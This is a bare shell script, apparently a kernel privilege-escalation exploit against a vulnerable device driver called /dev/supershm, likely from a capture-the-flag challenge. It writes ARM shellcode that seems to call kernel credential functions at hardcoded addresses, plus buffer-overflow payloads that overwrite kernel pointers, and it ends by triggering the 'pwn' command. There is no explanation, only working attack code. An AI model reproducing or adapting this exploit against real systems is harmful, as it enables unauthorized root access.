
// bf0011a8

echo 1
printf "c\xf2\x01\xf0\xe7" > /dev/supershm
printf "cA" > /dev/supershm
printf "uA" > /dev/supershm
#printf "\xf2\x01\xf0\xe7\xf2\x01\xf0\xe7" > /dev/supershm
printf "AAAA\x06\x40\x2D\xe9\x00\x00\xA0\xE3\x0C\x30\x9F\xE5\x33\xFF\x2F\xE1\x08\x30\x9F\xE5\x33\xFF\x2F\xE1\x06\x80\xbd\xe8\xf4\x87\x03\xc0\xb4\x84\x03\xc0" > /dev/supershm
echo 2
#c0013e68
#printf "cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa8\x11\x00\xbfAAAAB" > /dev/supershm
printf "cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\x3e\x01\xc0AAAAB" > /dev/supershm
#c0013e68 + 4 = 0xc0013e6c
#0xc0013e98
printf "cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98\x3e\x01\xc0AAAAB" > /dev/supershm
#printf "c\x06\x40\x2D\xe9\x00\x00\xA0\xE3\x0C\x30\x9F\xE5\x33\xFF\x2F\xE1\x08\x30\x9F\xE5\x33\xFF\x2F\xE1\x06\x40\xbd\xe8\xf4\x87\x03\xc0\xb4\x84\x03\xc0"
echo 3
printf "uB" > /dev/supershm
printf "\x9c\x0c\x00\xbf" > /dev/supershm
printf "\x04\x1c\x32\xc3" > /dev/supershm
echo 4
printf "pwn" > /dev/supershm